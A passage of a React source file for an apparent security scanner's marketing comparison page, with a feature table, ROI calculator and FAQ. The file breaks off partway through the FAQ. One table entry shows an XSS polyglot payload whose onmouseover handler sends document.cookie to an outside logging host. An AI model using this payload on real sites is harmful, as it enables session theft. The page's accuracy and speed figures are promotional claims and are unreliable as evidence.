import { useState } from "react";
import { Link } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Slider } from "@/components/ui/slider";
import { ArrowLeft, Check, X, ChevronDown, ChevronUp } from "lucide-react";

const ComparisonPage = () => {
    const [expandedRow, setExpandedRow] = useState<number | null>(null);
    const [scansPerWeek, setScansPerWeek] = useState(20);
    const [hourlyRate, setHourlyRate] = useState(100);

    const toggleRow = (index: number) => {
        setExpandedRow(expandedRow === index ? null : index);
    };

    // ROI Logic
    // Legacy Scan: 60 mins | SentinelX: 2 mins | Delta: 58 mins (0.966 hours)
    // Savings = Scans * 0.966 * Rate * 52 weeks
    const hoursSavedPerYear = scansPerWeek * 0.966 * 52;
    const annualSavings = Math.round(hoursSavedPerYear * hourlyRate);
    const hoursSaved = Math.round(hoursSavedPerYear);

    return (
        <div className="min-h-screen bg-background font-sans text-foreground selection:bg-primary/20">
            {/* Header */}
            <header className="fixed top-0 inset-x-0 z-50 bg-background/80 backdrop-blur-md border-b border-border/40">
                <div className="container mx-auto px-6 h-16 flex items-center justify-between">
                    <Link to="/" className="flex items-center gap-2 group">
                        <ArrowLeft className="h-5 w-5 text-muted-foreground group-hover:text-primary transition-colors" />
                        <span className="font-bold text-lg">Back to Home</span>
                    </Link>
                    <div className="flex items-center gap-2">
                        <div className="h-8 w-8 bg-gradient-to-tr from-primary to-purple-500 rounded-lg flex items-center justify-center font-bold text-white shadow-lg shadow-primary/20">
                            S
                        </div>
                        <span className="font-bold text-xl tracking-tight hidden sm:block">Sentinel<span className="text-primary">X</span></span>
                    </div>
                </div>
            </header>

            <main className="pt-32 pb-24 container mx-auto px-6">
                <div className="text-center mb-16">
                    <h1 className="text-4xl md:text-6xl font-bold mb-6 tracking-tight">
                        Detailed <span className="text-primary">Benchmark</span>
                    </h1>
                    <p className="text-xl text-muted-foreground max-w-3xl mx-auto">
                        A transparent, technical comparison between SentinelX's active edge engine and legacy vulnerability scanners.
                    </p>
                </div>

                <div className="w-full bg-card/20 backdrop-blur-sm border border-border/50 rounded-3xl overflow-hidden shadow-2xl">
                    <div>
                        <table className="w-full border-collapse">
                            <thead>
                                <tr className="border-b border-border/50 text-left">
                                    <th className="p-6 text-muted-foreground font-medium uppercase text-xs tracking-wider w-1/4 pl-12">Feature</th>
                                    <th className="p-6 text-destructive font-bold text-lg w-1/4 bg-destructive/5">Legacy Scanners<br /><span className="text-xs font-normal opacity-70">Nessus, Qualys, Rapid7</span></th>
                                    <th className="p-6 text-amber-500 font-bold text-lg w-1/4">Manual Tools<br /><span className="text-xs font-normal opacity-70 text-muted-foreground">Burp Suite, OWASP ZAP</span></th>
                                    <th className="p-6 text-primary font-bold text-2xl w-1/4 bg-primary/10 border-l-2 border-primary">SentinelX<br /><span className="text-xs font-normal opacity-70 text-foreground">Next-Gen Engine</span></th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-border/30">
                                {[
                                    {
                                        feature: "Scanning Engine",
                                        legacy: "Signature Matching (Regex)",
                                        manual: "Human Intuition",
                                        sentinelx: "Heuristic & Behavior Analysis",
                                        details: {
                                            problem: "Legacy scanners rely on static databases of 'known bad' signatures. They check if a software version matches a CVE list or if a response body contains a specific string (regex). This fails against custom code or modern frameworks that obfuscate responses.",
                                            solution: "SentinelX uses an Active Heuristic Engine. Instead of just looking for patterns, it safely tries to 'break' the application like a human hacker would. It injects benign payloads and analyzes the application's behavioral change—time delays, error stack traces, or size differences.",
                                            technical: "Our engine uses 'Polyglot Payloads'—single strings designed to allow execution in multiple contexts (HTML, SQL, JS). We measure 'Time-to-First-Byte' (TTFB) deviations to detect Blind SQL Injection with 99.9% confidence, even when no error is returned.",
                                            evidence: {
                                                type: "Polyglot Payload",
                                                code: "\"><script>alert(1)</script><div onmouseover=\"fetch('https://log.sentinelx.io?c='+document.cookie)\" style=\"width:100%;height:100%\" />"
                                            }
                                        }
                                    },
                                    {
                                        feature: "False Positives",
                                        legacy: "High (~40%)",
                                        manual: "Low (Verified by human)",
                                        sentinelx: "Near Zero (Active Verification)",
                                        details: {
                                            problem: "Traditional tools aim for 'coverage' rather than accuracy, flooding developers with hundreds of 'Potential' vulnerabilities. This causes 'Alert Fatigue', leading teams to ignore security reports entirely.",
                                            solution: "We implement 'Proof-based Scanning'. SentinelX will not report a vulnerability unless it can successfully exploit it (in a non-destructive way) to prove its existence. Rest assured: if it's in the report, it's real.",
                                            technical: "For every potential hit, we run a 'Verification Routine'. E.g., for an XSS finding, we verify that our injected token is not just present in the response, but is executing within a valid HTML context and not sanitized by the browser.",
                                            evidence: {
                                                type: "Verification Logic (Pseudo)",
                                                code: "if (response_body.includes(payload) && !is_sanitized(payload, response_headers)) {\n  launch_headless_browser(url, payload);\n  if (alert_triggered) report_vuln();\n}"
                                            },
                                            visual: { type: "SignalNoise" }
                                        }
                                    },
                                    {
                                        feature: "Speed",
                                        legacy: "Hours / Days",
                                        manual: "Weeks / Months",
                                        sentinelx: "Minutes (Real-time)",
                                        details: {
                                            problem: "Legacy scanners run on single-threaded appliances or VMs. Scaling means buying more 'Scanner Appliances'. Queues build up, and scans take hours, making them impossible to run on every code commit.",
                                            solution: "SentinelX is built on a Serverless Edge Architecture. We spin up hundreds of ephemeral scan instances simultaneously close to your region. This massive parallelism allows us to map and scan an entire asset in minutes.",
                                            technical: "We utilize Node.js streams and Go-based micro-crawlers distributed across global edge regions. Network latency is minimized, and throughput is maximized without crashing your server (customizable Rate Limiting).",
                                            evidence: {
                                                type: "Parallel Architecture",
                                                code: "await Promise.all(chunks.map(chunk => \n  edge_worker.scan(chunk, { concurrency: 50, region: 'closest' })\n));"
                                            },
                                            visual: { type: "SpeedChart" }
                                        }
                                    },
                                    {
                                        feature: "Deployment",
                                        legacy: "Heavy Appliances / Agents",
                                        manual: "Desktop Application",
                                        sentinelx: "Agentless / Cloud-Native",
                                        details: {
                                            problem: "Enterprise scanners often require installing heavy agents on every server or provisioning 'Scanner VMs' inside your VPC. This creates a maintenance nightmare and potential security risks.",
                                            solution: "Zero-Touch Deployment. SentinelX is 100% SaaS and Agentless. You simply verify domain ownership (via DNS or File Upload), and we scan your external perimeter immediately. No software to install, no patches to manage.",
                                            technical: "Our architecture is fully API-driven. For internal scans, we offer a lightweight ephemeral Docker container that tunnels traffic securely back to our engine, destroying itself after the scan completes.",
                                            evidence: {
                                                type: "Docker Run",
                                                code: "docker run --rm -e TOKEN=xyz sentinelx/agent scan --internal --target http://localhost:3000"
                                            },
                                            visual: { type: "Topology" }
                                        }
                                    },
                                    {
                                        feature: "API Security",
                                        legacy: "Basic (Swagger only)",
                                        manual: "Excellent (but slow)",
                                        sentinelx: "Advanced (Shadow API Discovery)",
                                        details: {
                                            problem: "Most automated tools need a Swagger/OpenAPI file to know what to scan. They completely miss 'Shadow APIs'—hidden endpoints your frontend uses but aren't documented.",
                                            solution: "We crawl your Single Page Applications (React, Vue, Angular) and analyze the client-side JavaScript. We extract API routes dynamically constructed in your code to find endpoints you didn't even know existed.",
                                            technical: "We use AST (Abstract Syntax Tree) parsing on minified JavaScript bundles. We look for patterns matching `fetch()`, `axios.get()`, and XHR calls to reconstruct your API surface map automatically.",
                                            evidence: {
                                                type: "Shadow API Discovery",
                                                code: "Found undocumented route: POST /api/v1/admin/users\nSource: main.js:2345 (axios.post('/api/v1/admin/users', data))"
                                            }
                                        }
                                    },
                                    {
                                        feature: "Cost Model",
                                        legacy: "$$$ Per IP Address",
                                        manual: "$$$$ Per Consultant Hour",
                                        sentinelx: "$ Usage Based / Flat Team",
                                        details: {
                                            problem: "Legacy licensing penalizes growth. You pay per IP address or per 'Asset'. This discourages spinning up staging environments or temporary cloud instances because it costs extra money to secure them.",
                                            solution: "Developer-Friendly Pricing. We charge based on active team members or flat usage tiers. Spin up 1,000 staging environments? Go ahead. Security should enable innovation, not tax it.",
                                            technical: "Our billing system is inextricably linked to 'Value Delivered' (successful scans/month) rather than 'Infrastructure Owned', aligning our incentives with your growth.",
                                            evidence: {
                                                type: "Billing Transparency",
                                                code: "Plan: Developer Team\nIncludes: Unlimited Assets, 5 Users\nOverage: $0.00 (Flat Rate)"
                                            },
                                            visual: { type: "CostGraph" }
                                        }
                                    },
                                    {
                                        feature: "CI/CD Integration",
                                        legacy: "Difficult (Plugins often break)",
                                        manual: "Impossible",
                                        sentinelx: "Native (GitHub Action)",
                                        details: {
                                            problem: "Security is usually a 'Gatekeeper' at the end of the process. Legacy tools have brittle Jenkins plugins that break builds with false positives, making developers hate security tools.",
                                            solution: "SentinelX CLI is designed for pipelines. It runs fast enough to be a blocking step for PRs. It outputs SARIF formats natively so results appear directly in your GitHub Security tab.",
                                            technical: "One-line integration: `npx sentinelx-cli scan --target $URL`. We support `--fail-on critical` flags to only break the build for real issues, keeping velocity high.",
                                            evidence: {
                                                type: "GitHub Workflow",
                                                code: "- name: SentinelX Scan\n  run: npx sentinelx-cli scan --target $STAGING_URL --fail-on critical"
                                            }
                                        }
                                    },
                                    {
                                        feature: "Compliance",
                                        legacy: "Manual PDFs",
                                        manual: "Spreadsheets",
                                        sentinelx: "Automated Dashboard",
                                        details: {
                                            problem: "Mapping vulnerabilities to compliance frameworks (SOC2, ISO 27001) is a tedious manual process involving spreadsheets and expensive auditors.",
                                            solution: "We automatically map every finding to the specific controls it violates. Generating a compliance artifact for your auditor is a single click.",
                                            technical: "Our vulnerability database is meta-tagged with compliance identifiers (e.g., 'SOC2 CC7.1'). Reporting engine aggregates these into a ready-to-sign PDF.",
                                            evidence: {
                                                type: "Audit Log JSON",
                                                code: "\"compliance\": {\n  \"framework\": \"SOC2\",\n  \"control\": \"CC7.1\",\n  \"status\": \"failed\",\n  \"trace_id\": \"audit-123\"\n}"
                                            },
                                            visual: { type: "ComplianceBadge" }
                                        }
                                    },
                                    {
                                        feature: "Smart Remediation",
                                        legacy: "Generic Advice",
                                        manual: "Consultant Report",
                                        sentinelx: "AI-Generated Patch",
                                        details: {
                                            problem: "Knowing you have a bug is only half the battle. Developers need to know *exactly* how to fix it in their specific language and framework context.",
                                            solution: "SentinelX uses context-aware AI to generate the exact code patch needed to fix the vulnerability. Review the diff, apply, and merge.",
                                            technical: "We feed the vulnerable code snippet (context) and the vulnerability type into our fine-tuned LLM to generate a secure replacement function.",
                                            evidence: {
                                                type: "Patch Generation",
                                                code: "Applying patch for SQL Injection...\n> Fixed: db.query('SELECT * FROM users WHERE id = $1', [input])"
                                            },
                                            visual: { type: "DiffViewer" }
                                        }
                                    },
                                    {
                                        feature: "Zero-Day Response",
                                        legacy: "Monthly Updates",
                                        manual: "Reactive / Late",
                                        sentinelx: "Instant Engine Push",
                                        details: {
                                            problem: "When a major zero-day hits (like Log4Shell), legacy scanners need to wait for a firmare update or a patch download, leaving you exposed for days.",
                                            solution: "Because SentinelX is SaaS-native, we push new detection logic instantly. You are protected from new threats the moment we are.",
                                            technical: "Our detection rules are decoupled from the scanning binary and fetched at runtime. We can deploy a new rule globally in <5 minutes.",
                                            evidence: {
                                                type: "Rule Update Log",
                                                code: "[10:00 AM] Zero-Day Identified\n[10:05 AM] Global Rule #9482 Deployed\n[10:06 AM] Fleet Protection Active"
                                            },
                                            visual: { type: "Timeline" }
                                        }
                                    }
                                ].map((row, i) => (
                                    <>
                                        <tr key={i} onClick={() => toggleRow(i)} className="hover:bg-muted/10 transition-colors cursor-pointer group">
                                            <td className="p-6 align-top max-w-xs relative text-foreground">
                                                <div className="flex items-center gap-3">
                                                    <div className={`p-1 rounded-full transition-colors ${expandedRow === i ? "bg-primary/20 text-primary" : "bg-muted/20 text-muted-foreground group-hover:bg-primary/10 group-hover:text-primary"}`}>
                                                        {expandedRow === i ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
                                                    </div>
                                                    <div className="font-bold text-lg">{row.feature}</div>
                                                </div>
                                            </td>
                                            <td className="p-6 align-top text-muted-foreground bg-destructive/[0.02] border-x border-dashed border-destructive/10 text-lg">
                                                {row.legacy}
                                            </td>
                                            <td className="p-6 align-top text-muted-foreground text-lg">
                                                {row.manual}
                                            </td>
                                            <td className="p-6 align-top font-bold text-foreground bg-primary/[0.05] border-l-2 border-primary/10 relative text-xl">
                                                {row.sentinelx}
                                                {i === 1 && <span className="absolute top-6 right-6 flex h-3 w-3"><span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75"></span><span className="relative inline-flex rounded-full h-3 w-3 bg-primary"></span></span>}
                                            </td>
                                        </tr>
                                        {expandedRow === i && (
                                            <tr className="bg-muted/[0.02]">
                                                <td colSpan={4} className="p-0 border-b border-border/50">
                                                    <div className="p-8 mx-auto max-w-6xl animate-in fade-in slide-in-from-top-2 duration-300">
                                                        <div className="flex flex-col gap-8">
                                                            <div className="space-y-4">
                                                                <h4 className="text-sm font-bold text-destructive uppercase tracking-wider flex items-center gap-2">
                                                                    <X className="h-4 w-4" /> The Problem
                                                                </h4>
                                                                <p className="text-muted-foreground leading-relaxed text-sm">
                                                                    {row.details.problem}
                                                                </p>
                                                            </div>

                                                            <div className="space-y-4">
                                                                <h4 className="text-sm font-bold text-primary uppercase tracking-wider flex items-center gap-2">
                                                                    <Check className="h-4 w-4" /> Our Solution
                                                                </h4>
                                                                <p className="text-foreground leading-relaxed text-sm font-medium">
                                                                    {row.details.solution}
                                                                </p>
                                                            </div>

                                                            <div className="space-y-4 bg-card/40 p-6 rounded-xl border border-border/50 flex flex-col justify-between">
                                                                <div>
                                                                    <h4 className="text-xs font-bold text-muted-foreground uppercase tracking-wider mb-2">
                                                                        Technical Deep Dive
                                                                    </h4>
                                                                    <p className="text-xs text-muted-foreground font-mono leading-relaxed mb-4">
                                                                        {row.details.technical}
                                                                    </p>
                                                                </div>
                                                                {row.details.evidence && (
                                                                    <div className="bg-black/90 rounded-lg p-4 font-mono text-xs text-green-400 border border-white/10 shadow-inner overflow-x-auto relative group-code">
                                                                        <div className="absolute top-2 right-2 text-[10px] text-muted-foreground uppercase tracking-widest opacity-50">
                                                                            {row.details.evidence.type}
                                                                        </div>
                                                                        <pre className="whitespace-pre-wrap break-all">
                                                                            <code>{row.details.evidence.code}</code>
                                                                        </pre>
                                                                    </div>
                                                                )}
                                                            </div>

                                                            {/* Visual Column */}
                                                            <div className="space-y-4 bg-card/40 p-6 rounded-xl border border-border/50 flex flex-col justify-center items-center">
                                                                <h4 className="text-xs font-bold text-muted-foreground uppercase tracking-wider mb-4 w-full text-left">
                                                                    Visual Proof
                                                                </h4>
                                                                {row.details.visual ? (
                                                                    <div className="w-full h-full min-h-[160px] flex items-center justify-center">
                                                                        {/* Speed Chart */}
                                                                        {row.details.visual.type === "SpeedChart" && (
                                                                            <div className="w-full space-y-4">
                                                                                <div className="space-y-2">
                                                                                    <div className="flex justify-between text-xs text-muted-foreground"><span>Legacy Scanners</span><span>~48 Hours</span></div>
                                                                                    <div className="h-4 bg-destructive/20 rounded-full overflow-hidden w-full relative">
                                                                                        <div className="absolute top-0 left-0 h-full bg-destructive w-full animate-[width_1s_ease-out_forwards]" />
                                                                                    </div>
                                                                                </div>
                                                                                <div className="space-y-2">
                                                                                    <div className="flex justify-between text-xs text-foreground font-bold"><span>SentinelX</span><span>2 Minutes</span></div>
                                                                                    <div className="h-4 bg-primary/20 rounded-full overflow-hidden w-full relative">
                                                                                        <div className="absolute top-0 left-0 h-full bg-primary w-[4%] animate-[width_1s_ease-out_forwards]" />
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        )}

                                                                        {/* Signal to Noise */}
                                                                        {row.details.visual.type === "SignalNoise" && (
                                                                            <div className="flex gap-4 items-end justify-center w-full h-32">
                                                                                <div className="flex flex-col items-center gap-2 group cursor-pointer w-1/3">
                                                                                    <div className="w-full bg-destructive/20 rounded-t-lg relative overflow-hidden h-24 flex flex-col justify-end">
                                                                                        <div className="h-[40%] bg-destructive w-full absolute bottom-0 left-0" />
                                                                                        <span className="relative z-10 text-[10px] font-bold text-destructive-foreground text-center w-full p-1 opacity-100">40% False</span>
                                                                                    </div>
                                                                                    <span className="text-xs text-muted-foreground text-center">Legacy</span>
                                                                                </div>
                                                                                <div className="flex flex-col items-center gap-2 group cursor-pointer w-1/3">
                                                                                    <div className="w-full bg-primary/20 rounded-t-lg relative overflow-hidden h-24 flex flex-col justify-end">
                                                                                        <div className="h-[1%] bg-destructive w-full absolute bottom-0 left-0" />
                                                                                        <div className="h-[99%] bg-primary w-full absolute bottom-[1%] left-0" />
                                                                                        <span className="relative z-10 text-[10px] font-bold text-primary-foreground text-center w-full p-1">&lt;1% False</span>
                                                                                    </div>
                                                                                    <span className="text-xs font-bold text-foreground text-center">SentinelX</span>
                                                                                </div>
                                                                            </div>
                                                                        )}

                                                                        {/* Topology */}
                                                                        {row.details.visual.type === "Topology" && (
                                                                            <div className="relative w-full h-32 border border-dashed border-border/50 rounded-lg p-2 flex items-center justify-between text-[10px]">
                                                                                <div className="flex flex-col items-center gap-1 z-10">
                                                                                    <div className="w-8 h-8 rounded-full bg-primary/10 border border-primary flex items-center justify-center font-bold text-primary">S</div>
                                                                                    <span className="text-foreground font-bold">Cloud</span>
                                                                                </div>
                                                                                <div className="flex-1 h-0.5 bg-gradient-to-r from-primary to-green-500 mx-2 relative">
                                                                                    <div className="absolute -top-3 left-1/2 -translate-x-1/2 text-primary font-bold">API</div>
                                                                                    <Check className="h-3 w-3 text-primary absolute -right-1.5 -top-1.5 bg-background rounded-full" />
                                                                                </div>
                                                                                <div className="flex flex-col items-center gap-1 z-10">
                                                                                    <div className="w-8 h-8 rounded bg-background border border-border flex items-center justify-center">🌐</div>
                                                                                    <span>App</span>
                                                                                </div>
                                                                                <div className="absolute top-2 right-2 text-primary text-[9px] border border-primary/30 px-1 rounded">Direct</div>
                                                                            </div>
                                                                        )}

                                                                        {/* Cost Graph */}
                                                                        {row.details.visual.type === "CostGraph" && (
                                                                            <div className="w-full h-32 relative flex items-end px-2 pb-4 border-l border-b border-border/50">
                                                                                {/* Legacy Line */}
                                                                                <svg className="absolute inset-0 h-full w-full pointer-events-none" viewBox="0 0 100 100" preserveAspectRatio="none">
                                                                                    <polyline points="0,100 50,50 100,0" fill="none" stroke="hsl(var(--destructive))" strokeWidth="2" strokeDasharray="4" />
                                                                                </svg>
                                                                                {/* SX Line */}
                                                                                <svg className="absolute inset-0 h-full w-full pointer-events-none" viewBox="0 0 100 100" preserveAspectRatio="none">
                                                                                    <polyline points="0,95 100,90" fill="none" stroke="hsl(var(--primary))" strokeWidth="3" />
                                                                                </svg>
                                                                                <span className="absolute top-0 right-0 text-[10px] text-destructive font-bold bg-destructive/10 px-1 rounded">Exp. ($$$)</span>
                                                                                <span className="absolute bottom-2 right-0 text-[10px] text-primary font-bold bg-primary/10 px-1 rounded">Linear ($)</span>
                                                                            </div>
                                                                        )}

                                                                        {/* Compliance Badge */}
                                                                        {row.details.visual.type === "ComplianceBadge" && (
                                                                            <div className="grid grid-cols-2 gap-2 w-full">
                                                                                {["SOC2", "ISO 27001", "HIPAA", "GDPR"].map(std => (
                                                                                    <div key={std} className="bg-primary/10 border border-primary/20 rounded p-2 flex items-center gap-2">
                                                                                        <Check className="h-3 w-3 text-primary" />
                                                                                        <span className="text-[10px] font-bold text-primary">{std}</span>
                                                                                    </div>
                                                                                ))}
                                                                            </div>
                                                                        )}

                                                                        {/* Diff Viewer */}
                                                                        {row.details.visual.type === "DiffViewer" && (
                                                                            <div className="w-full font-mono text-[10px] bg-black/90 p-2 rounded border border-border/50 overflow-hidden">
                                                                                <div className="text-destructive/80 truncate">- const q = `SELECT..${"$"}{id}`;</div>
                                                                                <div className="text-green-400 truncate">+ const q = `SELECT..$1`;</div>
                                                                                <div className="text-green-400 truncate">+ const v = [input];</div>
                                                                            </div>
                                                                        )}

                                                                        {/* Timeline */}
                                                                        {row.details.visual.type === "Timeline" && (
                                                                            <div className="w-full relative pl-4 border-l border-border/50 space-y-4">
                                                                                <div className="relative">
                                                                                    <div className="absolute -left-[21px] top-1 h-2.5 w-2.5 rounded-full bg-destructive" />
                                                                                    <div className="text-[10px] text-muted-foreground">Log4j Disclosed (0h)</div>
                                                                                </div>
                                                                                <div className="relative">
                                                                                    <div className="absolute -left-[21px] top-1 h-2.5 w-2.5 rounded-full bg-primary animate-pulse" />
                                                                                    <div className="text-[10px] text-foreground font-bold">SentinelX Updated (2h)</div>
                                                                                </div>
                                                                                <div className="relative">
                                                                                    <div className="absolute -left-[21px] top-1 h-2.5 w-2.5 rounded-full bg-muted border border-border" />
                                                                                    <div className="text-[10px] text-muted-foreground">Legacy Patched (30d)</div>
                                                                                </div>
                                                                            </div>
                                                                        )}
                                                                    </div>
                                                                ) : (
                                                                    <div className="hidden lg:flex w-full h-full min-h-[160px] bg-muted/5 rounded-xl border border-border/20 items-center justify-center text-muted-foreground/30 text-xs italic">
                                                                        No visual data
                                                                    </div>
                                                                )}
                                                            </div>
                                                        </div>
                                                    </div>
                                                </td>
                                            </tr>
                                        )}
                                    </>
                                ))}
                            </tbody>
                        </table>
                    </div>
                </div>

                <div className="mt-24 max-w-5xl mx-auto">
                    <div className="bg-card/20 backdrop-blur-sm border border-border/50 rounded-3xl p-8 md:p-12 shadow-2xl">
                        <div className="text-center mb-10">
                            <h2 className="text-3xl font-bold mb-4">Calculate Your <span className="text-primary">ROI</span></h2>
                            <p className="text-muted-foreground">See how much "The Cost of Waiting" is actually costing your business.</p>
                        </div>

                        <div className="grid md:grid-cols-2 gap-12 items-center">
                            <div className="space-y-8">
                                <div className="space-y-4">
                                    <div className="flex justify-between items-center">
                                        <label className="font-bold text-foreground">Scans Per Week</label>
                                        <span className="text-primary font-mono font-bold bg-primary/10 px-3 py-1 rounded-lg">{scansPerWeek}</span>
                                    </div>
                                    <Slider
                                        value={[scansPerWeek]}
                                        onValueChange={(vals) => setScansPerWeek(vals[0])}
                                        max={100}
                                        step={1}
                                        className="py-4"
                                    />
                                    <p className="text-xs text-muted-foreground">How many times does your team trigger a scan (PRs, deploys)?</p>
                                </div>

                                <div className="space-y-4">
                                    <div className="flex justify-between items-center">
                                        <label className="font-bold text-foreground">Engineer Hourly Rate</label>
                                        <span className="text-primary font-mono font-bold bg-primary/10 px-3 py-1 rounded-lg">${hourlyRate}/hr</span>
                                    </div>
                                    <Slider
                                        value={[hourlyRate]}
                                        onValueChange={(vals) => setHourlyRate(vals[0])}
                                        min={50}
                                        max={300}
                                        step={10}
                                        className="py-4"
                                    />
                                    <p className="text-xs text-muted-foreground">Average fully-loaded cost of a developer waiting for pipeline results.</p>
                                </div>
                            </div>

                            <div className="bg-gradient-to-br from-primary/10 to-purple-500/10 border border-primary/20 rounded-2xl p-8 relative overflow-hidden text-center">
                                <div className="absolute inset-0 bg-grid-white/[0.02] bg-[size:20px_20px]" />
                                <div className="relative z-10">
                                    <h3 className="text-muted-foreground font-semibold uppercase tracking-wider text-xs mb-2">Projected Annual Savings</h3>
                                    <div className="text-5xl md:text-6xl font-black text-transparent bg-clip-text bg-gradient-to-r from-primary to-purple-500 mb-2">
                                        ${annualSavings.toLocaleString()}
                                    </div>
                                    <p className="text-sm font-medium text-foreground mb-6">
                                        + {hoursSaved.toLocaleString()} Developer Hours Saved
                                    </p>
                                    <div className="text-xs text-muted-foreground">
                                        *Based on saving 58 minutes per scan vs legacy tools.
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div className="mt-32 max-w-6xl mx-auto">
                    <div className="text-center mb-16">
                        <h2 className="text-3xl font-bold mb-4">Plays Nice With Your <span className="text-primary">Stack</span></h2>
                        <p className="text-muted-foreground">SentinelX isn't another dashboard to ignore. It lives where your team works.</p>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-8 relative">
                        {/* Connecting Line (Desktop) */}
                        <div className="hidden md:block absolute top-1/2 left-0 w-full h-0.5 bg-gradient-to-r from-transparent via-primary/50 to-transparent -translate-y-1/2 z-0" />

                        {/* Card 1: Code */}
                        <div className="bg-background border border-border/50 rounded-2xl p-6 relative z-10 flex flex-col items-center text-center shadow-lg hover:border-primary/50 transition-colors group">
                            <div className="h-16 w-16 bg-muted rounded-full flex items-center justify-center mb-4 group-hover:scale-110 transition-transform">
                                <svg className="h-8 w-8 text-foreground" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" /></svg>
                            </div>
                            <h3 className="font-bold text-lg mb-2">Code & Build</h3>
                            <p className="text-sm text-muted-foreground">
                                We catch vulns in PRs via <span className="text-foreground font-medium">GitHub Actions</span> & <span className="text-foreground font-medium">GitLab CI</span>.
                            </p>
                        </div>

                        {/* Card 2: Engine (Center) */}
                        <div className="bg-primary/5 border border-primary/20 rounded-2xl p-8 relative z-10 flex flex-col items-center text-center shadow-2xl shadow-primary/20 scale-110">
                            <div className="absolute -top-3 -right-3 bg-primary text-primary-foreground text-xs font-bold px-3 py-1 rounded-full animate-bounce">
                                LIVE
                            </div>
                            <div className="h-20 w-20 bg-gradient-to-br from-primary to-purple-600 rounded-2xl flex items-center justify-center mb-6 shadow-lg rotate-3">
                                <span className="text-3xl font-bold text-white">S</span>
                            </div>
                            <h3 className="font-bold text-xl mb-2">SentinelX Engine</h3>
                            <p className="text-sm text-muted-foreground">
                                Orchestrating scans, verifying payloads, and filtering noise.
                            </p>
                        </div>

                        {/* Card 3: Alert */}
                        <div className="bg-background border border-border/50 rounded-2xl p-6 relative z-10 flex flex-col items-center text-center shadow-lg hover:border-primary/50 transition-colors group">
                            <div className="h-16 w-16 bg-muted rounded-full flex items-center justify-center mb-4 group-hover:scale-110 transition-transform">
                                <svg className="h-8 w-8 text-foreground" viewBox="0 0 24 24" fill="currentColor"><path d="M5.042 15.165a2.528 2.528 0 0 1-2.52 2.523A2.528 2.528 0 0 1 0 15.165a2.527 2.527 0 0 1 2.522-2.52h2.52v2.52zM6.313 15.165a2.527 2.527 0 0 1 2.521-2.52 2.527 2.527 0 0 1 2.521 2.52v6.313A2.528 2.528 0 0 1 8.834 24a2.528 2.528 0 0 1-2.521-2.522v-6.313zM8.834 5.042a2.528 2.528 0 0 1-2.521-2.52A2.528 2.528 0 0 1 8.834 0a2.528 2.528 0 0 1 2.521 2.522v2.52h-2.521zM5.042 6.313a2.528 2.528 0 0 1-2.52-2.521A2.528 2.528 0 0 1 5.042 1.27h6.313A2.528 2.528 0 0 1 13.877 3.79a2.528 2.528 0 0 1-2.522 2.521H5.042zM12.605 15.165a2.528 2.528 0 0 1 2.52-2.52 2.528 2.528 0 0 1 2.522 2.52v6.313A2.528 2.528 0 0 1 15.126 24a2.528 2.528 0 0 1-2.52-2.522v-6.313zM1.291 8.834a2.528 2.528 0 0 1 2.521-2.522A2.528 2.528 0 0 1 6.334 8.834v2.521H3.812a2.528 2.528 0 0 1-2.521-2.521zM22.709 8.834a2.528 2.528 0 0 1-2.521-2.522 2.528 2.528 0 0 1 2.521-2.522 2.528 2.528 0 0 1 2.522 2.522v2.521h-2.522zM24 15.165a2.528 2.528 0 0 1-2.522 2.523 2.528 2.528 0 0 1-2.521-2.523v-2.52h2.521c1.39 0 2.522 1.13 2.522 2.52zM18.916 5.042a2.528 2.528 0 0 1-2.521-2.52A2.528 2.528 0 0 1 18.916 0c1.39 0 2.522 1.13 2.522 2.522v2.52h-2.522zM18.916 18.958a2.528 2.528 0 0 1-2.521 2.522 2.528 2.528 0 0 1-2.522-2.522v-6.313h2.522c1.39 0 2.521 1.13 2.521 2.522v3.791zM11.354 8.834a2.527 2.527 0 0 1 2.521-2.522 2.527 2.527 0 0 1 2.522 2.522v2.521h-5.043V8.834zM15.126 11.355h-2.522c0-1.391-1.129-2.521-2.521-2.521h-2.522V8.834a5.05 5.05 0 0 1 5.043-5.043 5.051 5.051 0 0 1 5.043 5.043v2.521h-2.521z" /></svg>
                            </div>
                            <h3 className="font-bold text-lg mb-2">One-Click Alert</h3>
                            <p className="text-sm text-muted-foreground">
                                We push findings instantly to <span className="text-foreground font-medium">Slack</span>, <span className="text-foreground font-medium">Jira</span>, and <span className="text-foreground font-medium">Linear</span>.
                            </p>
                        </div>
                    </div>
                </div>

                <div className="mt-32 max-w-4xl mx-auto">
                    <div className="text-center mb-16">
                        <h2 className="text-3xl font-bold mb-4">Unanswered <span className="text-primary">Questions?</span></h2>
                        <p className="text-muted-foreground">We know you have them. Here are the honest answers.</p>
                    </div>

                    <div className="space-y-4">
                        {[
                            {
                                q: "Is it safe to run on production?",
                                a: "Yes. SentinelX uses non-destructive payloads by default. We verify vulnerabilities (like SQLi) using time delays (wait 5s) rather than dropping tables. For sensitive environments, you can whitelist our IP or run via our Docker agent behind your firewall."
                            },
                            {
                                q: "Do you support GraphQL/gRPC?",
                                a: "GraphQL support is native—we introspect schemas and fuzz arguments. gRPC is currently in Beta for enterprise plans. We also fully support REST, SOAP (legacy), and WebSocket APIs."
                            },
                            {
                                q: "How do you handle False Positives?",
